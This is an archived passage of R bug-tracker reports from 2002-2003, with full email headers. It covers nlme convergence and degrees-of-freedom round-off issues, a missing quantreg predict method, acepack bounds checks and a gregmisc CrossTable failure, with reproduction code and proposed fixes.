becomes asymptotic to a finite value
from above in some direction,
or stepmx is too small.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.6850998 0.8350804
Function Value
[1] 1045.188
Gradient:
[1] -3.359382  2.358456

iteration = 7
Parameter:
[1] 1.2650078 0.8239839
Function Value
[1] 1044.447
Gradient:
[1] -1.484124e-08  2.278477e-08

Last global step failed to locate a point lower than x.
Either x is an approximate local minimum of the function,
the function is too non-linear for this algorithm,
or steptol is too large.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 1.2680136 0.8245307
Function Value
[1] 1044.426
Gradient:
[1]  2.646877 -2.508084

iteration = 1
Parameter:
[1] -1511.2495885     0.8231376
Function Value
[1] 827.6179
Gradient:
[1] 1.473509e-19 3.477226e+01

Maximum step size exceeded 5 consecutive times.
Either the function is unbounded below,
becomes asymptotic to a finite value
from above in some direction,
or stepmx is too small.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.6851144 0.8350799
Function Value
[1] 1045.188
Gradient:
[1] -3.359088  2.358286

iteration = 6
Parameter:
[1] 1.2649473 0.8239835
Function Value
[1] 1044.448
Gradient:
[1]  2.968390e-08 -6.835435e-08

Successive iterates within tolerance.
Current iterate is probably solution.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 1.267994 0.824532
Function Value
[1] 1044.427
Gradient:
[1]  2.646853 -2.507863

iteration = 1
Parameter:
[1] -1511.2336349     0.8231352
Function Value
[1] 828.0258
Gradient:
[1] -6.701743e-20  3.365341e+01

Maximum step size exceeded 5 consecutive times.
Either the function is unbounded below,
becomes asymptotic to a finite value
from above in some direction,
or stepmx is too small.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.6851079 0.8350803
Function Value
[1] 1045.188
Gradient:
[1] -3.359215  2.358392

iteration = 7
Parameter:
[1] 1.2649721 0.8239836
Function Value
[1] 1044.447
Gradient:
[1] 1.484166e-08 4.556957e-08

Last global step failed to locate a point lower than x.
Either x is an approximate local minimum of the function,
the function is too non-linear for this algorithm,
or steptol is too large.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 1.268001 0.824530
Function Value
[1] 1044.427
Gradient:
[1]  2.646867 -2.508106

iteration = 1
Parameter:
[1] -1511.2385145     0.8231441
Function Value
[1] 825.0983
Gradient:
[1] -9.146131e-19  3.823514e+01

Maximum step size exceeded 5 consecutive times.
Either the function is unbounded below,
becomes asymptotic to a finite value
from above in some direction,
or stepmx is too small.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.6849865 0.8350865
Function Value
[1] 1045.184
Gradient:
[1] -3.361722  2.360234

iteration = 6
Parameter:
[1] 1.265490 0.823985
Function Value
[1] 1044.442
Gradient:
[1] -1.254955e-20 -6.835423e-08

Successive iterates within tolerance.
Current iterate is probably solution.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 1.2681041 0.8245325
Function Value
[1] 1044.426
Gradient:
[1]  2.647101 -2.508336

iteration = 1
Parameter:
[1] -1511.3262872     0.8231335
Function Value
[1] 828.0964
Gradient:
[1] 2.680533e-19 3.401084e+01

Maximum step size exceeded 5 consecutive times.
Either the function is unbounded below,
becomes asymptotic to a finite value
from above in some direction,
or stepmx is too small.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.6850990 0.8350805
Function Value
[1] 1045.188
Gradient:
[1] -3.359395  2.358484

iteration = 7
Parameter:
[1] 1.2650090 0.8239838
Function Value
[1] 1044.447
Gradient:
[1] -4.452368e-08 -2.278478e-08

Last global step failed to locate a point lower than x.
Either x is an approximate local minimum of the function,
the function is too non-linear for this algorithm,
or steptol is too large.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 1.2680059 0.8245313
Function Value
[1] 1044.426
Gradient:
[1]  2.646886 -2.508011

iteration = 1
Parameter:
[1] -1511.24342     0.82312
Function Value
[1] 827.5457
Gradient:
[1] -1.234659e-18  3.430500e+01

Maximum step size exceeded 5 consecutive times.
Either the function is unbounded below,
becomes asymptotic to a finite value
from above in some direction,
or stepmx is too small.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.6851253 0.8350791

==> 2369.reply.1 <==
From bates@bates5.stat.wisc.edu  Fri Dec 13 00:13:06 2002
Received: from bates5.stat.wisc.edu (mail@bates5.stat.wisc.edu [128.105.174.135])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id AAA28071
	for <R-bugs@biostat.ku.dk>; Fri, 13 Dec 2002 00:13:06 +0100 (MET)
Received: from bates by bates5.stat.wisc.edu with local (Exim 3.36 #1 (Debian))
	id 18McV4-0002vX-00; Thu, 12 Dec 2002 17:12:14 -0600
To: jerome@hivnet.ubc.ca
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] convergence problem with nlme() (PR#2369)
References: <200212122243.XAA27894@pubhealth.ku.dk>
From: Douglas Bates <bates@stat.wisc.edu>
Date: 12 Dec 2002 17:12:14 -0600
In-Reply-To: <200212122243.XAA27894@pubhealth.ku.dk>
Message-ID: <6radjade7l.fsf@bates5.stat.wisc.edu>
Lines: 12
User-Agent: Gnus/5.0808 (Gnus v5.8.8) XEmacs/21.4 (Common Lisp)
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Sender: Douglas Bates <bates@bates5.stat.wisc.edu>

It turns out that you learn more if you set verbose = TRUE in the call
to nlme rather than setting control = nlmeControl(msVerbose = TRUE).

The verbose = TRUE option shows you that the parameter values are
bouncing back and forth between two regions of the parameter space,
neither of which are close to the optimum.  It happens that nlm will
occasionally take very large steps at the beginning of the
optimization resulting in unusual parameter values.

This example is a difficult optimization problem.  It may be possible
to stabilize it somewhat by replacing the internal calls to nlm by
calls to optim but that brings its own set of difficulties.

==> 2369.audit <==
Sun Dec 15 08:53:57 2002	ripley	foobar
Sun Dec 15 08:53:57 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2374 *
Subject: quantreg package - predict method for rq objects
From: John Maindonald <u9801539@leonard.anu.edu.au>
Date: Sat, 14 Dec 2002 20:46:34 +1100 (EST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2374 <==
From mailnull@stat.math.ethz.ch  Sat Dec 14 10:47:34 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA08577
	for <R-bugs@biostat.ku.dk>; Sat, 14 Dec 2002 10:47:33 +0100 (MET)
Received: from hypatia.math.ethz.ch (mailnull@localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id gBE9khgo024271
	(version=TLSv1/SSLv3 cipher=EDH-RSA-DES-CBC3-SHA bits=168 verify=NO)
	for <R-bugs@biostat.ku.dk>; Sat, 14 Dec 2002 10:46:44 +0100 (MET)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.6/8.12.6/Submit) id gBE9khMO024270
	for R-bugs@biostat.ku.dk; Sat, 14 Dec 2002 10:46:43 +0100 (MET)
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id gBE9kcgn024245
	for <r-bugs@lists.r-project.org>; Sat, 14 Dec 2002 10:46:40 +0100 (MET)
Received: from anumail4.anu.edu.au ([150.203.2.44] helo=anu.edu.au)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 18N8sY-0008MD-00
	for <r-bugs@r-project.org>; Sat, 14 Dec 2002 03:46:38 -0600
Received: from leonard.anu.edu.au (leonard.anu.edu.au [150.203.2.15])
	by anu.edu.au (8.12.4/8.12.4) with ESMTP id gBE9kZBo015610
	for <r-bugs@r-project.org>; Sat, 14 Dec 2002 20:46:35 +1100 (EST)
Received: (from u9801539@localhost)
	by leonard.anu.edu.au (8.11.6/8.11.6) id gBE9kYl17197
	for r-bugs@r-project.org; Sat, 14 Dec 2002 20:46:34 +1100 (EST)
Date: Sat, 14 Dec 2002 20:46:34 +1100 (EST)
From: John Maindonald <u9801539@leonard.anu.edu.au>
Message-Id: <200212140946.gBE9kYl17197@leonard.anu.edu.au>
To: r-bugs@r-project.org
Subject: quantreg package - predict method for rq objects
X-Sender: u9801539@leonard.anu.edu.au
X-Sender-Domain: leonard.anu.edu.au
X-Spam-Score: (0.4)
X-Spam-Tests: FROM_ENDS_IN_NUMS
X-Scanned-By: MIMEDefang 2.15 (www dot roaringpenguin dot com slash mimedefang)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=1.7 required=5.0
	tests=FROM_ENDS_IN_NUMS,SPAM_PHRASE_00_01
	version=2.43
X-Spam-Level: *

In help(rq.object), under Methods, it says:
"
The `"rq"' class of objects has methods for the following generic 
     functions:  `coef', `effects' , `formula' , `labels' , 
     `model.frame' , `model.matrix' , `plot' , `predict' , `print' ,
     `print.summary' , `residuals' , `summary'
"
There seems to be no predict method:

> y <- rnorm(500)
> u <- rq(y ~ 1, tau=.75)
Warning message: 
Solution may be nonunique in: rq.fit.br(x, y, tau = tau, ...) 
> predict(u)
Error in predict(u) : no applicable method for "predict"

[I have looked both at the Windows and at the Darwin/X11 versions.]

John Maindonald                     email : john.maindonald@anu.edu.au
Centre for Bioinformation Science,  phone : (6125)3473        
c/o MSI,                            fax   : (6125)5549 
John Dedman Mathematical Sciences Building (Building 27)
Australian National University
Canberra ACT 0200
Australia


==> 2374.audit <==
Sun Dec 15 08:53:15 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2384 *
Subject: degrees of freedom in nlme()
From: jerome@hivnet.ubc.ca
Date: Fri, 20 Dec 2002 01:40:06 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2384 <==
From jerome@hivnet.ubc.ca  Fri Dec 20 01:40:07 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA27734
	for <R-bugs@biostat.ku.dk>; Fri, 20 Dec 2002 01:40:06 +0100 (MET)
Date: Fri, 20 Dec 2002 01:40:06 +0100 (MET)
From: jerome@hivnet.ubc.ca
Message-Id: <200212200040.BAA27734@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: degrees of freedom in nlme()

Full_Name: Jerome Asselin
Version: 1.6.1
OS: RedHat Linux 7.2
Submission from: (NULL) (142.103.173.179)



There is something very queer happening with the degrees
of freedom in nlme(). In the example below, I am fitting
the same model with lme() and nlme(). I am using the
nlme package version 3.1-34.


library(nlme)
set.seed(14)

a <- 2
x <- rep(rnorm(3),rep(5,3))
id <- rep(c("a","b","c"),rep(5,3))
y <- a+x+rnorm(15)
data <- data.frame(y=y,id=id)
initx <- matrix(x[c(1,6,11)],dimnames=list(c("a","b","c"),"x"))

summary(fit.lme <-
              lme(y ~ 1,data=data,random=~1|id,method="ML"))
summary(fit.nlme <-
              nlme(y ~ a + x, fixed= a~1, random=x~1|id,
              data=data, start=list(fixed=c(a=2),
              random=list(id=initx)),method="ML"))


The number of degrees of freedom for the intercept parameter
is 12 degrees using lme(), but only 2 degrees using nlme().
The same problem is noticed with seeds 15, 16 and 17.

But if I change the seed to 18 and try again, then I get 12
degrees of freedom for both lme() and nlme().


set.seed(18)

a <- 2
x <- rep(rnorm(3),rep(5,3))
id <- rep(c("a","b","c"),rep(5,3))
y <- a+x+rnorm(15)
data <- data.frame(y=y,id=id)
initx <- matrix(x[c(1,6,11)],dimnames=list(c("a","b","c"),"x"))

summary(fit.lme <-
              lme(y ~ 1,data=data,random=~1|id,method="ML"))
summary(fit.nlme <-
              nlme(y ~ a + x, fixed= a~1, random=x~1|id,
              data=data, start=list(fixed=c(a=2),
              random=list(id=initx)),method="ML"))


If I set the seed to 5 or 8, then nlme() fails despite the
simplicity of the model. The error messages are:
- for set.seed(5): 
    Step halving factor reduced below minimum in PNLS step
- for set.seed(8):
    Singularity in backsolve at level 0, block 1
This issue of degrees of freedom may be related to the
convergence problems stated in another bug report (PR#2369).

Sincerely,
Jerome Asselin

set.seed(5)

a <- 2
x <- rep(rnorm(3),rep(5,3))
id <- rep(c("a","b","c"),rep(5,3))
y <- a+x+rnorm(15)
data <- data.frame(y=y,id=id)
initx <- matrix(x[c(1,6,11)],dimnames=list(c("a","b","c"),"x"))

summary(fit.lme <-
              lme(y ~ 1,data=data,random=~1|id,method="ML"))
summary(fit.nlme <-
              nlme(y ~ a + x, fixed= a~1, random=x~1|id,
              data=data, start=list(fixed=c(a=2),
              random=list(id=initx)),method="ML"))


set.seed(8)

a <- 2
x <- rep(rnorm(3),rep(5,3))
id <- rep(c("a","b","c"),rep(5,3))
y <- a+x+rnorm(15)
data <- data.frame(y=y,id=id)
initx <- matrix(x[c(1,6,11)],dimnames=list(c("a","b","c"),"x"))

summary(fit.lme <-
              lme(y ~ 1,data=data,random=~1|id,method="ML"))
summary(fit.nlme <-
              nlme(y ~ a + x, fixed= a~1, random=x~1|id,
              data=data, start=list(fixed=c(a=2),
              random=list(id=initx)),method="ML"))


==> 2384.audit <==
Fri Dec 27 09:19:24 2002	ripley	moved from incoming to Add-ons

==> 2384.followup.1 <==
From jerome@hivnet.ubc.ca  Mon Jan  6 21:00:39 2003
Received: from hivnet.ubc.ca (mailhost.hivnet.ubc.ca [142.103.173.1])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA11133
	for <R-bugs@biostat.ku.dk>; Mon, 6 Jan 2003 21:00:38 +0100 (MET)
Received: from there (jeromePC [142.103.173.179])
	by hivnet.ubc.ca (8.9.0/8.9.0) with SMTP id MAA22901
	for <R-bugs@biostat.ku.dk>; Mon, 6 Jan 2003 12:03:48 -0800 (PST)
Message-Id: <200301062003.MAA22901@hivnet.ubc.ca>
Content-Type: text/plain;
  charset="iso-8859-1"
From: Jerome Asselin <jerome@hivnet.ubc.ca>
Organization: BC Centre for Excellence in HIV/AIDS
To: R-bugs@biostat.ku.dk
Subject: Re: [Rd] degrees of freedom in nlme() (PR#2384)
Date: Mon, 6 Jan 2003 12:05:15 -0800
X-Mailer: KMail [version 1.3.2]
References: <200212122243.XAA27894@pubhealth.ku.dk> <6radjade7l.fsf@bates5.stat.wisc.edu>
In-Reply-To: <6radjade7l.fsf@bates5.stat.wisc.edu>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit


I believe that a round-off error is causing nlme() to provide a wrong number 
of degrees of freedom. In the example below, getFixDF() returns 2 degrees
of freedom, but it should be 12 degrees of freedom according to lme().

R 1.6.1 on RedHat Linux 7.2
Package: nlme
Version: 3.1-36
Date: 2002-12-28

library(nlme)
set.seed(14)

a <- 2
x <- rep(rnorm(3),rep(5,3))
id <- rep(c("a","b","c"),rep(5,3))
y <- a+x+rnorm(15)
data <- data.frame(y=y,id=id)
initx <- matrix(x[c(1,6,11)],dimnames=list(c("a","b","c"),"x"))
rm(a,x,id,y)

summary(fit.lme <-
              lme(y ~ 1,data=data,random=~1|id,method="ML"))
debug(getFixDF)
summary(fit.nlme <-
              nlme(y ~ a + x, fixed= a~1, random=x~1|id,
              data=data, start=list(fixed=c(a=2),
              random=list(id=initx)),method="ML"))

# From within getFixDF(), do the following check...
Browse[1]> apply(X, 2, function(el) any(el != el[1])) #Round-off error here!!
   a
TRUE
Browse[1]> X
   a
1  1
2  1
3  1
4  1
5  1
6  1
7  1
8  1
9  1
10 1
11 1
12 1
13 1
14 1
15 1

# If I force X[ ] <- X[1] in this case, then the result of nlme() is 
concordant with that of lme().


# Below is what I get with the current version of the nlme package.

> summary(fit.lme <-
+               lme(y ~ 1,data=data,random=~1|id,method="ML"))
Linear mixed-effects model fit by maximum likelihood
 Data: data
       AIC      BIC    logLik
  46.09706 48.22121 -20.04853

Random effects:
 Formula: ~1 | id
        (Intercept)  Residual
StdDev:   0.5019741 0.8299741

Fixed effects: y ~ 1
               Value Std.Error DF  t-value p-value
(Intercept) 1.671345 0.3730901 12 4.479736   8e-04

Standardized Within-Group Residuals:
       Min         Q1        Med         Q3        Max
-2.1912914 -0.5408147 -0.1515690  0.7275933  1.3373572

Number of Observations: 15
Number of Groups: 3

> summary(fit.nlme <-
+               nlme(y ~ a + x, fixed= a~1, random=x~1|id,
+               data=data, start=list(fixed=c(a=2),
+               random=list(id=initx)),method="ML"))
Nonlinear mixed-effects model fit by maximum likelihood
  Model: y ~ a + x
 Data: data
       AIC      BIC    logLik
  46.09706 48.22121 -20.04853

Random effects:
 Formula: x ~ 1 | id
                x  Residual
StdDev: 0.5019711 0.8299748

Fixed effects: a ~ 1
     Value Std.Error DF  t-value p-value
a 1.671345 0.3730888  2 4.479752  0.0464

Standardized Within-Group Residuals:
       Min         Q1        Med         Q3        Max
-2.1912919 -0.5408166 -0.1515696  0.7275931  1.3373593

Number of Observations: 15
Number of Groups: 3

==> 2384.followup.2 <==
From jerome@hivnet.ubc.ca Tue Apr  1 21:23:37 2003
Received: from hivnet.ubc.ca (hivnet.ubc.ca [142.103.173.1])
	by pubhealth.ku.dk (8.12.8/8.12.8) with ESMTP id h31JNan9002402
	for <R-bugs@biostat.ku.dk>; Tue, 1 Apr 2003 21:23:36 +0200 (MET DST)
Received: from there (jeromePC [142.103.173.179])
	by hivnet.ubc.ca (8.9.0/8.9.0) with SMTP id LAA07104;
	Tue, 1 Apr 2003 11:28:18 -0800 (PST)
Message-Id: <200304011928.LAA07104@hivnet.ubc.ca>
Content-Type: text/plain;
  charset="iso-8859-1"
From: Jerome Asselin <jerome@hivnet.ubc.ca>
Organization: BC Centre for Excellence in HIV/AIDS
To: r-help@stat.math.ethz.ch
Subject: lme() and nlme() give inconsistent numbers of degrees of freedom (PR#2384)
Date: Tue, 1 Apr 2003 11:22:55 -0800
X-Mailer: KMail [version 1.3.2]
Cc: R-bugs@biostat.ku.dk
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit


I apologize for cross-posting.

In the reproducable example below, I fit the same model with lme() and 
nlme(). However, I get 12 degrees of freedom with lme() and 2 df with 
nlme().

library(nlme)
set.seed(14)

a <- 2
x <- rep(rnorm(3),rep(5,3))
id <- rep(c("a","b","c"),rep(5,3))
y <- a+x+rnorm(15)
data <- data.frame(y=y,id=id)
initx <- matrix(x[c(1,6,11)],dimnames=list(c("a","b","c"),"x"))

summary(fit.lme <-
              lme(y ~ 1,data=data,random=~1|id,method="ML"))
summary(fit.nlme <-
              nlme(y ~ a + x, fixed= a~1, random=x~1|id,
              data=data, start=list(fixed=c(a=2),
              random=list(id=initx)),method="ML"))

When I try the same thing with set.seed(18), I get 12 df for both.

I have submitted a bug report on that issue on Dec 20th and I have tried 
to find the source of the problem, but no success. You can check what I 
found so far at:
http://r-bugs.biostat.ku.dk/cgi-bin/R/Add-ons?id=2384

Can anyone help find the source of this problem?

Sincerely,
Jerome Asselin

R 1.6.2 on Red Hat Linux 7.2
Package: nlme 3.1-38


==> 2384.followup.3 <==
From jerome@hivnet.ubc.ca Fri Jul  4 00:49:04 2003
Received: from hivnet.ubc.ca (mailhost.hivnet.ubc.ca [142.103.173.1])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h63Mn2JH000110
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 00:49:03 +0200 (MET DST)
Received: from there (jeromePC [142.103.177.13])
	by hivnet.ubc.ca (8.9.0/8.9.0) with SMTP id PAA11044
	for <R-bugs@biostat.ku.dk>; Thu, 3 Jul 2003 15:54:51 -0700 (PDT)
Message-Id: <200307032254.PAA11044@hivnet.ubc.ca>
Content-Type: text/plain;
  charset="iso-8859-1"
From: Jerome Asselin <jerome@hivnet.ubc.ca>
Organization: BC Centre for Excellence in HIV/AIDS
To: R-bugs@biostat.ku.dk
Subject: Re: [Rd] degrees of freedom in nlme() (PR#2384)
Date: Thu, 3 Jul 2003 15:48:30 -0700
X-Mailer: KMail [version 1.3.2]
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit


I would like to document my findings (with a potential FIX) regarding the 
issue of calculation of the degrees of freedom with nlme().

The program given at the bottom of this email generates and fit 20 data 
sets with a mixed-effects LINEAR model, but using the function nlme() 
instead of lme(). In each case, the correct number of degrees of freedom 
for the intercept parameter is 12. However, in 7 of the 20 sets, round-off 
errors cause the calculated number of degrees of freedom to be 2 instead 
of 12. Moreover, in 3 cases, the algorithm failed to converge (represented 
by NA).

> DF
 1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20
 2 NA  2 NA 12 12 12 NA 12 12  2  2 12  2 12 12  2 12  2 12

A potential fix for this issue would be to replace line 7282 of 
R/library/nlme/R/nlme from this expression:
  if (any(notIntX <- apply(X, 2, function(el) any(el != el[1])))) {
to this expression:
  if (any(notIntX <- apply(X, 2, function(el) any(abs(el - 
el[1])>10*sqrt(.Machine$double.eps))))) {

The constant 10*sqrt(.Machine$double.eps) is rather arbitrary and I am not 
sure which value would be best to use. However, this correction allows to 
calculate correct degrees of freedom in the simulations, although it does 
not correct convergence failures, as shown below. I believe those failures 
are happening in the C code, which I haven't deeply examined.

> DF
 1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20
12 NA 12 NA 12 12 12 NA 12 12 12 12 12 12 12 12 12 12 12 12

I agree that in principle linear mixed-effects models should be fit with 
lme(), not nlme(). However, nlme() may return the wrong number of degrees 
of freedom without warning and because of that I believe this issue should 
be considered seriously.

Sincerely,
Jerome Asselin

nlme package version: 3.1-43
R version: 1.7.1 running on Red Hat Linux 7.2

###########
library(nlme)

nseeds <- 20
DF <- numeric(nseeds)
for(i in 1:nseeds)
{
set.seed(i)

a <- 2
x <- rep(rnorm(3),rep(5,3))
id <- rep(c("a","b","c"),rep(5,3))
y <- a+x+rnorm(15)
data <- data.frame(y=y,id=id)
initx <- matrix(x[c(1,6,11)],dimnames=list(c("a","b","c"),"x"))

tryerror <- try(fit.nlme <-
              nlme(y ~ a + x, fixed= a~1, random=x~1|id,
              data=data, start=list(fixed=c(a=2),
              random=list(id=initx)),method="ML"))

DF[i] <- ifelse(attr(tryerror,"class")[1]=="try-error",NA,fit.nlme$fixDF$X)
}
names(DF) <- 1:nseeds
DF
###########

-- 

Jerome Asselin (Jérôme), Statistical Analyst
British Columbia Centre for Excellence in HIV/AIDS
St. Paul's Hospital, 608 - 1081 Burrard Street
Vancouver, British Columbia, CANADA V6Z 1Y6
Email: jerome@hivnet.ubc.ca
Phone: 604 806-9112   Fax: 604 806-9044
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2386 *
Subject: ace and avas in acepack
From: Frank E Harrell Jr <fharrell@virginia.edu>
Date: Fri, 20 Dec 2002 12:59:07 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2386 <==
From fharrell@virginia.edu  Fri Dec 20 18:59:26 2002
Received: from cgatepro-2.mail.virginia.edu (neon.mail.Virginia.EDU [128.143.2.220])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA06856
	for <r-bugs@biostat.ku.dk>; Fri, 20 Dec 2002 18:59:26 +0100 (MET)
Received: from [128.143.108.90] (HELO fharrell.biostat)
  by cgatepro-2.mail.virginia.edu (CommuniGate Pro SMTP 3.5.9)
  with SMTP id 29368136; Fri, 20 Dec 2002 12:58:38 -0500
Date: Fri, 20 Dec 2002 12:59:07 -0500
From: Frank E Harrell Jr <fharrell@virginia.edu>
To: r-bugs@biostat.ku.dk
Cc: Thomas Lumley <tlumley@u.washington.edu>
Subject: ace and avas in acepack
Message-Id: <20021220125907.57c1ad10.fharrell@virginia.edu>
Organization: University of Virginia
X-Mailer: Sylpheed version 0.8.2 (GTK+ 1.2.10; i386-redhat-linux-gnu)
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit

Under
            
platform i686-pc-linux-gnu
arch     i686             
os       linux-gnu        
system   i686, linux-gnu  
status                    
major    1                
minor    6.1              
year     2002             
month    11               
day      01               
language R                

and using acepack 1.3-2, ace() and avas() have checks such as 
            if(circ[i] < 0 || circ[i] > nrow(x)) {
            if(mon[i] < 0 || mon[i] > nrow(x)) {
            if(lin[i] < 0 || lin[i] > nrow(x)) {

etc.  I believe that nrow should be ncol.

Also, in ace() there is the follwing check:

            if (cat[i] == 0) {
                cat("response spec can only be lin or ordered (default)")
                return()
            }
whereas I believe that the ace algorithm does allow for categorical response variables.
-- 
Frank E Harrell Jr              Prof. of Biostatistics & Statistics
Div. of Biostatistics & Epidem. Dept. of Health Evaluation Sciences
U. Virginia School of Medicine  http://hesweb1.med.virginia.edu/biostat

==> 2386.audit <==
Fri Dec 27 09:19:24 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2480 *
Subject: bug in CrossTable (package:gregmisc)
From: John_Hendrickx@yahoo.com
Date: Tue, 21 Jan 2003 13:51:01 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2480 <==
From John_Hendrickx@yahoo.com  Tue Jan 21 13:51:02 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id NAA17686
	for <R-bugs@biostat.ku.dk>; Tue, 21 Jan 2003 13:51:01 +0100 (MET)
Date: Tue, 21 Jan 2003 13:51:01 +0100 (MET)
From: John_Hendrickx@yahoo.com
Message-Id: <200301211251.NAA17686@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: bug in CrossTable (package:gregmisc)

Full_Name: John Hendrickx
Version: 1.6.0
OS: Windows 98
Submission from: (NULL) (137.224.174.216)


CrossTable in the "gregmisc" package fails when the fisher.exact test produces
an error (I suspect this is because the number of cases is too large). This can
be fixed using "FTt <- try(fisher.test(t, alternative = "two.sided"))" or by
making the test optional.

bugtab <- array(c(
24,  31,  2,  50,
 4, 101, 16, 130,
 0,  29,  3,  52,
 3,  39, 11, 210))
dim(bugtab)<-c(4,4)
bugtab<-t(bugtab)
rownames(bugtab)<-c("a","b","c","d")
colnames(bugtab)<-c("A","B","C","D")
bugtab

thisworks<-trunc(bugtab/10)
thisworks

library(gregmisc)
# fisher.exact test works fine on small tables
CrossTable(thisworks)
# I suspect the bugtab table is too large
CrossTable(bugtab)


==> 2480.audit <==
Tue Jan 21 14:39:22 2003	ripley	moved from incoming to Add-ons

==> 2480.followup.1 <==
From mschwartz@medanalytics.com  Wed Jan 22 05:23:39 2003
Received: from mail12.atl.registeredsite.com (nobody@mail12.atl.registeredsite.com [64.224.219.86])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id FAA22283
	for <R-bugs@biostat.ku.dk>; Wed, 22 Jan 2003 05:23:38 +0100 (MET)
Received: from mail.medanalytics.com (mail.medanalytics.com [64.225.164.192])
	by mail12.atl.registeredsite.com (8.12.2/8.12.6) with ESMTP id h0M4Mn0s024550;
	Tue, 21 Jan 2003 23:22:49 -0500
Received: from MARC [64.225.164.192] by mail.medanalytics.com with ESMTP
  (SMTPD32-6.06) id AC96524D00F2; Tue, 21 Jan 2003 23:22:46 -0500
Reply-To: <mschwartz@medanalytics.com>
From: "Marc Schwartz" <mschwartz@medanalytics.com>
To: <John_Hendrickx@yahoo.com>, <r-devel@stat.math.ethz.ch>
Cc: <R-bugs@biostat.ku.dk>
Subject: RE: [Rd] bug in CrossTable (package:gregmisc) (PR#2480)
Date: Tue, 21 Jan 2003 22:22:45 -0600
Organization: MedAnalytics, Inc.
Message-ID: <009801c2c1cd$eaebe5e0$0201a8c0@MARC>
MIME-Version: 1.0
Content-Type: text/plain;
	charset="US-ASCII"
X-Priority: 3 (Normal)
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook, Build 10.0.4510
Importance: Normal
In-Reply-To: <200301211251.NAA17691@pubhealth.ku.dk>
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id FAA22283

> -----Original Message-----
> From: r-devel-admin@stat.math.ethz.ch 
> [mailto:r-devel-admin@stat.math.ethz.ch] On Behalf Of 
> John_Hendrickx@yahoo.com
> Sent: Tuesday, January 21, 2003 6:51 AM
> To: r-devel@stat.math.ethz.ch
> Cc: R-bugs@biostat.ku.dk
> Subject: [Rd] bug in CrossTable (package:gregmisc) (PR#2480)
> 
> 
> Full_Name: John Hendrickx
> Version: 1.6.0
> OS: Windows 98
> Submission from: (NULL) (137.224.174.216)
> 
> 
> CrossTable in the "gregmisc" package fails when the 
> fisher.exact test produces an error (I suspect this is 
> because the number of cases is too large). This can be fixed 
> using "FTt <- try(fisher.test(t, alternative = "two.sided"))" 
> or by making the test optional.
> 
> bugtab <- array(c(
> 24,  31,  2,  50,
>  4, 101, 16, 130,
>  0,  29,  3,  52,
>  3,  39, 11, 210))
> dim(bugtab)<-c(4,4)
> bugtab<-t(bugtab)
> rownames(bugtab)<-c("a","b","c","d")
> colnames(bugtab)<-c("A","B","C","D")
> bugtab
> 
> thisworks<-trunc(bugtab/10)
> thisworks
> 
> library(gregmisc)
> # fisher.exact test works fine on small tables
> CrossTable(thisworks)
> # I suspect the bugtab table is too large
> CrossTable(bugtab)

John,

Thank you for bringing this to my attention. I was out of town all day
on a business trip and will look at this issue further with fresh eyes
in the morning. I'll get an update to Greg as soon as I have a chance
to incorporate a fix.  I also have some pending updates for
barplot2(), so I will coordinate the updates with Greg to conserve his
time.

